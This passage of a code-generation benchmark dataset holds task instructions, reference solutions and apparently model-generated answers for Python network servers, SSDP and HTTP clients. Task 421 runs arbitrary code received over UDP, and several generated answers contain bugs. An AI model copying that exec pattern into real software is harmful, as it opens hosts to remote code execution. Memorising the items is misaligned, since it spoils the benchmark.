    "Canonical_solution": "from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        while True:\n            msg = self.request.recv(8192)\n            if not msg:\n                break\n            self.request.send(msg)\n\nclass EchoServer:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f'Echo server running on port {self.port}')\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "right_result": "import socketserver\n\nclass EchoHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            self.request.sendall(data)\n\nclass EchoServer:\n    def __init__(self, host: str = '', port: int = 20000):\n        self.host = host\n        self.port = port\n        self.server = socketserver.TCPServer((self.host, self.port), EchoHandler)\n\n    def serve_forever(self):\n        print(f\"Server started on {self.host}:{self.port}\")\n        self.server.serve_forever()"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Implement a TCP server using Twisted framework in Python that supports WebSocket connections, handles incoming data, and manages connection lifecycle events.\n\nClass Description: The solution consists of two classes: `HelloServerProtocol` (handles protocol-level operations) and `HelloServerFactory` (manages server configuration and startup).\n\nAttributes:\n\n- `HelloServerProtocol`:\n  - transport: [object] - Twisted transport object representing the connection\n- `HelloServerFactory`:\n  - host: [str] - Server host address (default: \"127.0.0.1\")\n  - port: [int] - Server port number (default: 9000)\n  - wrappedFactory: [object] - Twisted Factory instance for protocol handling\n  - factory: [object] - WebSocket-wrapped factory instance\n\nMethods:\n\n- `HelloServerProtocol`:\n  - connectionMade() -> None - Called when a new connection is established\n  - dataReceived(data: bytes) -> None - Called when data is received from client\n- `HelloServerFactory`:\n  - __init__(host: str = \"127.0.0.1\", port: int = 9000, enableCompression: bool = False, autoFragmentSize: int = 1024) -> None - Initializes factory with configuration\n  - start() -> None - Starts the TCP server and enters event loop",
    "Canonical_solution": "from twisted.internet.protocol import Protocol, Factory\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WrappingWebSocketServerFactory\n\nclass HelloServerProtocol(Protocol):\n    def connectionMade(self):\n        print(\"connectionMade\", self.transport.getHost(), self.transport.getPeer())\n        self.transport.write('how are you?' * 100)\n\n    def dataReceived(self, data):\n        print(\"dataReceived: {}\".format(data))\n\nclass HelloServerFactory:\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.wrappedFactory = Factory.forProtocol(HelloServerProtocol)\n        self.factory = WrappingWebSocketServerFactory(\n            self.wrappedFactory,\n            f\"ws://{self.host}:{self.port}\",\n            enableCompression=enableCompression,\n            autoFragmentSize=autoFragmentSize\n        )\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 68,
    "right_result": "from twisted.web import server, resource\nfrom twisted.internet import reactor, protocol\nfrom twisted.web.websocket import WebSocketFactory, WebSocketHandler\nimport json\n\nclass HelloServerProtocol(WebSocketHandler):\n    def connectionMade(self):\n        super().connectionMade()\n        self.transport.write(b\"Connection established\")\n\n    def dataReceived(self, data):\n        super().dataReceived(data)\n        message = data.decode('utf-8')\n        print(f\"Received: {message}\")\n        self.sendMessage(f\"Echo: {message}\".encode('utf-8'))\n\nclass HelloServerResource(resource.Resource):\n    isLeaf = True\n\n    def render(self, request):\n        return b\"Hello, WebSocket!\"\n\nclass HelloServerFactory(protocol.Factory):\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.enableCompression = enableCompression\n        self.autoFragmentSize = autoFragmentSize\n\n    def buildProtocol(self, addr):\n        return HelloServerProtocol()\n\n    def start(self):\n        reactor.listenTCP(self.port, self)\n\nif __name__ == \"__main__\":\n    factory = HelloServerFactory()\n    factory.start()\n    reactor.run()"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create an asynchronous function to send HTTP POST requests using httpx library in Python, handling JSON data and potential errors.\n\nFunction Description: The function sends an asynchronous HTTP POST request to a specified URL with JSON data, optional headers, and timeout settings. It automatically raises exceptions for non-success status codes and returns the parsed JSON response.\n\nInput:\n- url: str - The target URL for the POST request\n- data: dict - The JSON data to be sent in the request body\n- headers: dict (optional) - Additional HTTP headers to include (default: empty dict)\n- timeout: int | None (optional) - Request timeout in seconds (default: None)\n\nOutput:\n- dict - Parsed JSON response from the server if the request is successful\n- Raises httpx.HTTPStatusError if the response status code indicates an error (4xx or 5xx)",
    "Canonical_solution": "import json\nimport httpx\n\nasync def a_send_post_request(\n    url: str, data: dict, headers: dict = {}, timeout: int | None = None\n):\n    async with httpx.AsyncClient() as client:\n        response = await client.post(url, json=data, headers=headers, timeout=timeout)\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\n\nasync def async_post_request(url: str, data: dict, headers: dict = None, timeout: int | None = None) -> dict:\n    async with httpx.AsyncClient() as client:\n        try:\n            response = await client.post(url, json=data, headers=headers, timeout=timeout)\n            response.raise_for_status()\n            return response.json()\n        except httpx.HTTPStatusError as e:\n            raise e\n        except Exception as e:\n            raise RuntimeError(f\"An error occurred: {e}\") from e"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Implement a UDP server in Python using the socketserver module to handle client requests and send responses.\n\nClass Description: The solution consists of two classes: TimeHandler (request handler) and UDPServerWrapper (server wrapper). TimeHandler processes incoming UDP requests and sends back the current time, while UDPServerWrapper manages the UDP server lifecycle.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' - all interfaces)\n- port: int - The port number to bind the server to (default: 20000)\n- server: UDPServer - The UDP server instance created with the specified host and port\n\nMethods:\n- __init__(host: str = '', port: int = 20000) -> None - Initializes the UDPServerWrapper with host and port, creates a UDPServer instance with TimeHandler\n- serve_forever() -> None - Starts the UDP server and keeps it running indefinitely to handle incoming requests\n\nThe TimeHandler class (inherits from BaseRequestHandler) contains:\n- handle() -> None - Processes each incoming request, prints client info, gets current time, and sends response back to client",
    "Canonical_solution": "from socketserver import BaseRequestHandler, UDPServer\nimport time\n\nclass TimeHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        msg, sock = self.request\n        resp = time.ctime()\n        sock.sendto(resp.encode('ascii'), self.client_address)\n\nclass UDPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = UDPServer((self.host, self.port), TimeHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 72,
    "right_result": "import socketserver\nimport datetime\n\nclass TimeHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data, addr = self.request.recv(1024), self.request.address\n        print(f\"Client {addr} sent: {data}\")\n        current_time = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        self.request.sendall(current_time.encode())\n\nclass UDPServerWrapper(socketserver.UDPServer):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server = socketserver.UDPServer((host, port), TimeHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a UDP server using Twisted framework in Python that integrates with Mayavi for processing and executing received commands to manipulate 3D visualizations.\n\nClass Description: The implementation consists of two classes: M2UDP (a custom UDP protocol handler) and MayaviUDPServer (the main server class). The system receives UDP datagrams containing Python commands, executes them in a Mayavi visualization context, and renders the results.\n\nAttributes:\n\nengine: [object] - The Mayavi engine instance for visualization control\nmlab: [module] - The Mayavi mlab module for 3D visualization\nport: [int] - The UDP port number to listen on\nlogto: [file object] - Where to direct logging output\nscene: [object] - The current Mayavi scene (initialized from engine)\nproto: [M2UDP] - The protocol handler instance\n\nMethods:\n\nM2UDP.__init__: [__init__(engine=None, mlab=None)] -> [None] - Initializes the UDP protocol handler with Mayavi engine and mlab references\nM2UDP.datagramReceived: [datagramReceived(data, host_port)] -> [None] - Handles incoming UDP datagrams, executes contained Python code in Mayavi context, and triggers scene rendering\nMayaviUDPServer.__init__: [__init__(engine=None, port=9007, logto=sys.stdout)] -> [None] - Initializes the server with Mayavi engine, port configuration, and logging setup\nMayaviUDPServer.serve: [serve()] -> [None] - Starts the UDP server, binds the protocol handler, and runs the reactor loop",
    "Canonical_solution": "import sys\nimport wx\nfrom twisted.internet import wxreactor\nwxreactor.install()\nfrom twisted.internet.protocol import DatagramProtocol\nfrom twisted.internet import reactor\nfrom twisted.python import log\n\nclass M2UDP(DatagramProtocol):\n    def __init__(self, engine=None, mlab=None):\n        self.engine = engine\n        self.mlab = mlab\n        if self.engine is not None:\n            self.scene = self.engine.current_scene.scene\n\n    def datagramReceived(self, data, host_port):\n        host, port = host_port\n        log.msg(\"Received: %r from %s:%d\" % (data, host, port))\n        c = data.strip()\n        if len(c) > 0:\n            mlab = self.mlab\n            engine = self.engine\n            scene = self.scene\n            camera = scene.camera\n            try:\n                exec(c, locals(), globals())\n            except:\n                log.err()\n            scene.render()\n\nclass MayaviUDPServer:\n    def __init__(self, engine=None, port=9007, logto=sys.stdout):\n        from mayavi import mlab\n        self.engine = engine or mlab.get_engine()\n        self.port = port\n        self.logto = logto\n        self.mlab = mlab\n\n    def serve(self):\n        proto = M2UDP(engine=self.engine, mlab=self.mlab)\n        \n        if self.logto is not None:\n            log.startLogging(self.logto)\n        log.msg('Serving Mayavi2 UDP server on port', self.port)\n        log.msg('Using Engine', self.engine)\n\n        reactor.registerWxApp(wx.GetApp())\n        reactor.listenUDP(self.port, proto)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 73,
    "right_result": "from twisted.internet import reactor, protocol\nfrom mayavi.core.engine import Engine\nfrom mayavi.core.mlab import mlab\nimport sys\n\nclass M2UDP(protocol.DatagramProtocol):\n    def __init__(self, engine=None, mlab=None):\n        self.engine = engine\n        self.mlab = mlab\n\n    def datagramReceived(self, data, host_port):\n        try:\n            exec(data.decode('utf-8'), {'engine': self.engine, 'mlab': self.mlab})\n            self.engine.scene.render()\n        except Exception as e:\n            print(f\"Error executing command: {e}\", file=sys.stderr)\n\nclass MayaviUDPServer:\n    def __init__(self, engine=None, port=9007, logto=sys.stdout):\n        self.engine = engine or Engine()\n        self.port = port\n        self.logto = logto\n        self.proto = M2UDP(engine=self.engine, mlab=mlab)\n\n    def serve(self):\n        reactor.listenUDP(self.port, self.proto)\n        reactor.run()\n\nif __name__ == \"__main__\":\n    server = MayaviUDPServer()\n    server.serve()"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Implement a UDP server that listens for incoming messages on a specified IP address and port, processes the received data, and terminates when a specific exit command is received.\n\nFunction Description: The function `udp_server` creates a UDP socket, binds it to a local IP address and port, and continuously listens for incoming messages. It processes the received data by decoding it from bytes to a UTF-8 string and checks for an exit command to terminate the loop. The socket is closed once the loop exits.\n\nInput: None\n\nOutput: None",
    "Canonical_solution": "import socket\n\ndef udp_server():\n    UDP_IP = \"127.0.0.1\"\n    UDP_PORT = 6000\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((UDP_IP, UDP_PORT))\n\n    while True:\n        dataudp, addr = sock.recvfrom(1024)  # buffer size is 1024 bytes\n        try:\n            data = str(dataudp.rstrip('\\x00').decode('utf-8'))\n        except:\n            data = str(dataudp.decode('utf-8'))\n        \n        # Process received data here\n        \n        if \"Exit\" in data:\n            break\n\n    sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\n\ndef udp_server():\n    # Create a UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    # Bind the socket to the local IP and port\n    local_ip = '0.0.0.0'  # Listen on all interfaces\n    local_port = 12345\n    sock.bind((local_ip, local_port))\n    print(f\"UDP server listening on {local_ip}:{local_port}\")\n    \n    while True:\n        data, addr = sock.recvfrom(1024)  # Buffer size\n        message = data.decode('utf-8')\n        print(f\"Received message from {addr}: {message}\")\n        if message == \"exit\":\n            print(\"Exit command received. Shutting down server.\")\n            break\n    \n    # Close the socket when done\n    sock.close()"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a function to receive a multicast token via UDP communication, handling potential timeouts and interruptions gracefully.\n\nFunction Description: The function continuously listens for incoming UDP packets on a specified port, attempting to extract and decode a token from valid JSON messages. It runs in a loop until either a valid token is received or a cancellation flag is set. The function handles socket timeouts and other exceptions silently, only processing valid messages that match the expected format.\n\nInput: None (uses global variables for control flow)\n\nOutput: None (modifies global variable 'multicast_token' when successful)",
    "Canonical_solution": "import socket\nimport struct\nimport json\nimport threading\n\nglobal multicast_token, cancel_thread\nmulticast_token = None\ncancel_thread = False\n\ndef receive_token():\n    global multicast_token, cancel_thread\n    received_token = False\n    while received_token == False and cancel_thread == False:\n        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n        s.bind(('0.0.0.0', 6669))\n        s.settimeout(2)\n        try:\n            # despite suggestions of being unused, addr must remain present, or this will fail\n            msg, addr = s.recvfrom(255)\n            (msglen,) = struct.unpack(\">I\", msg[12:16])\n            msg = msg[16: msglen + 8].decode()\n            msg = json.loads(msg)\n            token = msg[\"token\"]\n            received_token = True\n            s.close()\n            multicast_token = token\n        except KeyboardInterrupt:\n            return\n        except:\n            pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport json\nimport threading\nimport time\n\nmulticast_token = None\nmulticast_address = \"224.1.1.1\"\nmulticast_port = 5005\ntimeout = 5\n\ndef receive_multicast_token():\n    global multicast_token\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(timeout)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((multicast_address, multicast_port))\n    mreq = socket.inet_aton(multicast_address) + socket.inet_aton(\"0.0.0.0\")\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n    \n    while True:\n        try:\n            data, addr = sock.recvfrom(1024)\n            try:\n                message = json.loads(data)\n                if \"token\" in message:\n                    multicast_token = message[\"token\"]\n                    break\n            except json.JSONDecodeError:\n                pass\n        except socket.timeout:\n            continue\n        except Exception as e:\n            pass\n    sock.close()"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Implement a function that listens for a multicast token over UDP, decodes the received message, and extracts the token value.\n\nFunction Description: The function continuously listens on a specified UDP port for incoming messages containing a token. When a valid message is received, it parses the message, extracts the token, and stores it in a global variable. The function handles socket creation, binding, timeout, and cleanup, and runs in a loop until a token is received or a cancellation flag is set.\n\nInput: None (uses global variables `multicast_token` and `cancel_thread` for state management)\n\nOutput: None (updates the global variable `multicast_token` with the received token if successful)",
    "Canonical_solution": "import socket\nimport struct\nimport json\nimport threading\nimport time\n\nglobal multicast_token, cancel_thread\nmulticast_token = None\ncancel_thread = False\n\ndef receive_token():\n    global multicast_token, cancel_thread\n    received_token = False\n    while received_token == False and cancel_thread == False:\n        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n        s.bind(('0.0.0.0', 6669))\n        s.settimeout(2)\n        try:\n            # despite suggestions of being unused, addr must remain present, or this will fail\n            msg, addr = s.recvfrom(255)\n            (msglen,) = struct.unpack(\">I\", msg[12:16])\n            msg = msg[16: msglen + 8].decode()\n            msg = json.loads(msg)\n            token = msg[\"token\"]\n            received_token = True\n            s.close()\n            multicast_token = token\n        except KeyboardInterrupt:\n            return\n        except:\n            pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport threading\nimport time\n\nmulticast_token = None\ncancel_thread = False\n\ndef listen_for_multicast_token():\n    global multicast_token, cancel_thread\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1.0)\n    multicast_group = \"224.1.1.1\"\n    port = 5005\n\n    try:\n        sock.bind(((\"0.0.0.0\", port)))\n        mreq = socket.inet_aton(multicast_group) + socket.inet_aton(\"0.0.0.0\")\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n    except Exception as e:\n        print(f\"Error setting up multicast: {e}\")\n        return\n\n    while not cancel_thread:\n        try:\n            data, addr = sock.recvfrom(65535)\n            if data:\n                token = data.decode().strip()\n                if token:\n                    multicast_token = token\n                    break\n        except socket.timeout:\n            continue\n        except Exception as e:\n            print(f\"Error receiving message: {e}\")\n            break\n\n    sock.close()\n\ndef start_listening():\n    global cancel_thread\n    threading.Thread(target=listen_for_multicast_token).start()"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Implement a Simple Service Discovery Protocol (SSDP) server using UDP multicast communication to handle device discovery and announcement in a network.\n\nClass Description: The SSDPServer class implements an SSDP server that listens for M-SEARCH requests and responds with device information. It supports device registration, unregistration, and sending byebye notifications when shutting down.\n\nAttributes:\n- ip_list: [list] - List of tuples containing local IP addresses and their subnet masks\n- sock_list: [list] - List of socket objects for each IP address\n- sock: [socket.socket] - Main UDP socket for communication\n- running: [bool] - Flag indicating if the server is running\n- ssdp_thread: [threading.Thread] - Thread running the server's main loop\n- sending_byebye: [bool] - Flag controlling whether to send byebye notifications\n- known: [dict] - Dictionary of registered services with their USN as keys\n\nMethods:\n- __init__() -> None - Initializes the SSDP server with default values\n- start() -> None - Starts the SSDP server thread\n- stop(byebye: bool) -> None - Stops the SSDP server thread, with option to send byebye notifications\n- run() -> None - Main server loop that handles incoming requests\n- datagram_received(data: bytes, host_port: tuple) -> None - Processes incoming UDP datagrams\n- discovery_request(headers: dict, host_port: tuple) -> None - Handles M-SEARCH discovery requests\n- get_subnet_ip(ip: str, mask: str) -> list - Calculates subnet IP address\n- shutdown() -> None - Cleans up resources and sends byebye notifications\n- register(usn: str, st: str, location: str, server: str, cache_control: str) -> None - Registers a new service\n- unregister(usn: str) -> None - Unregisters a service\n- do_byebye(usn: str) -> None - Sends byebye notification for a service\n- send_it(response: str, destination: tuple) -> None - Sends a response to the specified destination",
    "Canonical_solution": "import sys\nimport random\nimport socket\nimport logging\nimport threading\nfrom email.utils import formatdate\n\nSSDP_PORT = 1900\nSSDP_ADDR = '239.255.255.250'\nSERVER_ID = 'SSDP Server'\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = True\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.sending_byebye = True\n            self.ssdp_thread = threading.Thread(target=self.run, name=\"SSDP_THREAD\")\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        if self.running:\n            self.running = False\n            try:\n                socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'', (SSDP_ADDR, SSDP_PORT))\n            except Exception:\n                pass\n            self.sending_byebye = byebye\n            if self.ssdp_thread is not None:\n                self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)\n\n        if sys.platform == 'win32':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        elif sys.platform == 'darwin':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        elif hasattr(socket, \"SO_REUSEPORT\"):\n            try:\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            except socket.error:\n                try:\n                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                except socket.error:\n                    pass\n\n        self.ip_list = [('192.168.137.1', '255.255.255.0')] if sys.platform == 'win32' else []\n        self.sock_list = []\n        for ip, mask in self.ip_list:\n            try:\n                mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n                self.sock_list.append(Sock(ip))\n            except Exception:\n                pass\n\n        try:\n            self.sock.bind(('0.0.0.0', SSDP_PORT))\n        except Exception:\n            return\n        self.sock.settimeout(1)\n\n        while self.running:\n            try:\n                data, addr = self.sock.recvfrom(1024)\n                self.datagram_received(data, addr)\n            except socket.timeout:\n                continue\n\n        self.shutdown()\n        for ip, mask in self.ip_list:\n            mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n            try:\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP, mreq)\n            except Exception:\n                continue\n        self.sock.close()\n        self.sock = None\n\n    def datagram_received(self, data, host_port):\n        try:\n            header = data.decode().split('\\r\\n\\r\\n')[0]\n        except ValueError:\n            return\n        if len(header) == 0:\n            return\n\n        lines = header.split('\\r\\n')\n        cmd = lines[0].split(' ')\n        lines = map(lambda x: x.replace(': ', ':', 1), lines[1:])\n        lines = filter(lambda x: len(x) > 0, lines)\n        headers = dict(map(lambda x: (x[0].lower(), x[1]), [x.split(':', 1) for x in lines]))\n\n        if cmd[0] == 'M-SEARCH' and cmd[1] == '*':\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        (host, port) = host_port\n        for i in self.known.values():\n            if i['ST'] == headers['st'] or headers['st'] == 'ssdp:all':\n                response = ['HTTP/1.1 200 OK']\n                usn = None\n                for k, v in i.items():\n                    if k == 'USN':\n                        usn = v\n                    response.append('%s: %s' % (k, v))\n\n                if usn:\n                    response.append('DATE: %s' % formatdate(timeval=None, localtime=False, usegmt=True))\n                    response.extend(('', ''))\n                    destination = (host, port)\n                    for ip, mask in self.ip_list:\n                        if self.get_subnet_ip(ip, mask) == self.get_subnet_ip(host, mask):\n                            self.sock.sendto('\\r\\n'.join(response).format(ip).encode(), destination)\n                            break\n\n    def get_subnet_ip(self, ip, mask):\n        a = [int(n) for n in mask.split('.')]\n        b = [int(n) for n in ip.split('.')]\n        return [a[i] & b[i] for i in range(4)]\n\n    def shutdown(self):\n        for st in self.known:\n            self.do_byebye(st)\n        usn = [st for st in self.known]\n        for st in usn:\n            self.unregister(st)\n\n    def register(self, usn, st, location, server=SERVER_ID, cache_control='max-age=1800'):\n        self.known[usn] = {\n            'USN': usn,\n            'LOCATION': location,\n            'ST': st,\n            'EXT': '',\n            'SERVER': server,\n            'CACHE-CONTROL': cache_control\n        }\n\n    def unregister(self, usn):\n        del self.known[usn]\n\n    def do_byebye(self, usn):\n        if not self.sending_byebye:\n            return\n\n        resp = [\n            'NOTIFY * HTTP/1.1',\n            'HOST: %s:%d' % (SSDP_ADDR, SSDP_PORT),\n            'NTS: ssdp:byebye',\n        ]\n        try:\n            stcpy = dict(self.known[usn].items())\n            stcpy['NT'] = stcpy['ST']\n            del stcpy['ST']\n            resp.extend(map(lambda x: ': '.join(x), stcpy.items()))\n            resp.extend(('', ''))\n            if self.sock:\n                try:\n                    self.send_it('\\r\\n'.join(resp), (SSDP_ADDR, SSDP_PORT))\n                except (AttributeError, socket.error):\n                    pass\n        except KeyError:\n            pass\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.send_it(response, destination)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport threading\nimport json\nfrom socket import inet_ntoa, htons, ntohs, socket, AF_INET, SOCK_DGRAM\nfrom struct import pack, unpack\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = socket.socket(AF_INET, SOCK_DGRAM)\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = False\n        self.known = {}\n        self._initialize()\n\n    def _initialize(self):\n        self._setup_sockets()\n        self.running = True\n        self.ssdp_thread = threading.Thread(target=self.run)\n        self.ssdp_thread.start()\n\n    def _setup_sockets(self):\n        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:\n            if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):\n                self.ip_list.append((ip, '255.255.255.255'))\n                sock = socket.socket(AF_INET, SOCK_DGRAM)\n                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                sock.bind((ip, 1900))\n                sock.settimeout(1)\n                self.sock_list.append(sock)\n\n    def start(self):\n        pass\n\n    def stop(self, byebye=False):\n        self.running = False\n        if byebye:\n            self.sending_byebye = True\n        self.ssdp_thread.join()\n\n    def run(self):\n        while self.running:\n            for sock in self.sock_list:\n                try:\n                    data, host_port = sock.recvfrom(65507)\n                    self.datagram_received(data, host_port)\n                except socket.timeout:\n                    continue\n                except Exception as e:\n                    print(f\"Error: {e}\")\n            if self.sending_byebye:\n                self.shutdown()\n                break\n\n    def datagram_received(self, data, host_port):\n        headers = {}\n        lines = data.decode('utf-8').split('\\r\\n')\n        for line in lines:\n            if not line:\n                continue\n            if line.startswith('HTTP/'):\n                continue\n            if ': ' in line:\n                key, value = line.split(': ', 1)\n                headers[key] = value\n        if 'M-SEARCH' in headers.get('METHOD', ''):\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        if 'ST' in headers:\n            st = headers['ST']\n            for usn in self.known:\n                if st == self.known[usn]['st']:\n                    response = self._build_response(usn, headers, host_port)\n                    self.send_it(response, host_port)\n\n    def _build_response(self, usn, headers, host_port):\n        service = self.known[usn]\n        location = service['location']\n        server = service['server']\n        cache_control = service['cache_control']\n        response = f\"HTTP/1.1 200 OK\\r\\n\"\n        response += f\"Location: {location}\\r\\n\"\n        response += f\"Server: {server}\\r\\n\"\n        response += f\"Cache-Control: {cache_control}\\r\\n\"\n        response += \"Content-Type: application/xml+xml\\r\\n\"\n        response += \"Content-Length: 0\\r\\n\"\n        response += \"ST: \" + headers['ST'] + \"\\r\\n\"\n        response += \"USN: \" + usn + \"\\r\\n\\r\\n\"\n        return response.encode('utf-8')\n\n    def get_subnet_ip(self, ip, mask):\n        return [ip]\n\n    def shutdown(self):\n        for sock in self.sock_list:\n            sock.close()\n        self.sock.close()\n\n    def register(self, usn, st, location, server, cache_control):\n        self.known[usn] = {'st': st, 'location': location, 'server': server, 'cache_control': cache_control}\n\n    def unregister(self, usn):\n        if usn in self.known:\n            del self.known[usn]\n\n    def do_byebye(self, usn):\n        if usn in self.known:\n            self.unregister(usn)\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.sendto(response, destination)"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Python class that acts as an adapter between OpenAI's API format and Claude's API format, handling HTTP requests asynchronously using httpx and asyncio.\n\nClass Description: The ClaudeAdapter class facilitates communication with Claude's API by converting OpenAI-style requests to Claude's format and vice versa. It handles both synchronous and streaming responses, manages API keys, and processes HTTP requests with proper error handling.\n\nAttributes:\n- claude_api_key: str - The API key for Claude's service, either from environment variables or request headers\n- claude_base_url: str - The base URL for Claude's API endpoints (default: \"https://api.anthropic.com\")\n\nMethods:\n- __init__(claude_base_url: str = \"https://api.anthropic.com\") -> None - Initializes the adapter with optional base URL configuration\n- get_api_key(headers: dict) -> str - Extracts the API key from request headers or falls back to environment variable\n- chat(request: Request) -> AsyncGenerator - Main method that handles incoming requests, converts parameters, makes API calls, and yields responses in OpenAI format\n- openai_to_claude_params(openai_params: dict) -> dict - Converts OpenAI-style parameters to Claude's format (implementation not shown)\n- claude_to_chatgpt_response(claude_response: dict) -> dict - Converts Claude's response format to OpenAI's format (implementation not shown)\n- claude_to_chatgpt_response_stream(claude_response: dict) -> dict - Converts streaming response format (implementation not shown)",
    "Canonical_solution": "import httpx\nimport time\nimport json\nimport os\nfrom fastapi import Request\n\nclass ClaudeAdapter:\n    def __init__(self, claude_base_url=\"https://api.anthropic.com\"):\n        self.claude_api_key = os.getenv(\"CLAUDE_API_KEY\", None)\n        self.claude_base_url = claude_base_url\n\n    def get_api_key(self, headers):\n        auth_header = headers.get(\"authorization\", None)\n        if auth_header:\n            return auth_header.split(\" \")[1]\n        else:\n            return self.claude_api_key\n\n    async def chat(self, request: Request):\n        openai_params = await request.json()\n        headers = request.headers\n        claude_params = self.openai_to_claude_params(openai_params)\n        api_key = self.get_api_key(headers)\n\n        async with httpx.AsyncClient(timeout=120.0) as client:\n            if not claude_params.get(\"stream\", False):\n                response = await client.post(\n                    f\"{self.claude_base_url}/v1/complete\",\n                    headers={\n                        \"x-api-key\": api_key,\n                        \"accept\": \"application/json\",\n                        \"content-type\": \"application/json\",\n                        \"anthropic-version\": \"2023-06-01\",\n                    },\n                    json=claude_params,\n                )\n                if response.is_error:\n                    raise Exception(f\"Error: {response.status_code}\")\n                claude_response = response.json()\n                openai_response = self.claude_to_chatgpt_response(claude_response)\n                yield openai_response\n            else:\n                async with client.stream(\n                    \"POST\",\n                    f\"{self.claude_base_url}/v1/complete\",\n                    headers={\n                        \"x-api-key\": api_key,\n                        \"accept\": \"application/json\",\n                        \"content-type\": \"application/json\",\n                        \"anthropic-version\": \"2023-06-01\",\n                    },\n                    json=claude_params,\n                ) as response:\n                    if response.is_error:\n                        raise Exception(f\"Error: {response.status_code}\")\n                    async for line in response.aiter_lines():\n                        if line:\n                            stripped_line = line.lstrip(\"data:\")\n                            if stripped_line:\n                                try:\n                                    decoded_line = json.loads(stripped_line)\n                                    stop_reason = decoded_line.get(\"stop_reason\")\n                                    if stop_reason:\n                                        yield self.claude_to_chatgpt_response_stream(\n                                            {\n                                                \"completion\": \"\",\n                                         